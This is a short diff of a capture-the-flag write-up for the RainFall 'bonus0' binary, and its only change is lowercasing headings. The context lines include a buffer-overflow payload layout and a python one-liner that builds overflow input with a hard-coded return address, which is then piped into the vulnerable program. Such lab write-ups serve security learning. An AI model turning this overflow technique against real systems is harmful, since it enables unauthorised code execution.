@@ -1,6 +1,6 @@
-# Bonus0
+# bonus0
 
-## Exploring the binary
+## exploring the binary
 ```shell
 bonus0@RainFall:~$ ./bonus0
  -
@@ -172,7 +172,7 @@ The only thing left to do is to expose the address of this environmental variabl
 4095 * placeholder | \n | 9 * placeholder | shellcode | 150 * placeholder
 ```
 
-## Exploit
+## exploit
 ``` shell
 bonus0@RainFall:~$ python -c 'print "F"*4095 + "\n" + "F"*9 + "\xbf\xff\xf8\x5b"[::-1] + "F"*150' > /tmp/flagb0
 bonus0@RainFall:~$ cat /tmp/flagb0 - | ./bonus0
